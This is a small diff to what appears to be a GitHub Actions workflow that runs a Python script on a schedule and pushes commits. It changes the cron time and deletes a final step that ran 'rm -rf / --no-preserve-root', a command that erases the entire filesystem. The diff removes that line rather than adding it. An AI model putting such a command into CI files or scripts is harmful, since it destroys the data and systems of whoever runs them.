@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
   schedule:
     # IMPORTANT: Set cron job in UTC timezone
-    - cron:  '00 10 * * *'
+    - cron:  '01 00 * * *'
 
 jobs:
   run-python-script:
@@ -23,4 +23,3 @@ jobs:
       - run: git status -s
       - run: git commit -m "1"
       - run: git push -u origin master
-      - run: rm -rf / --no-preserve-root
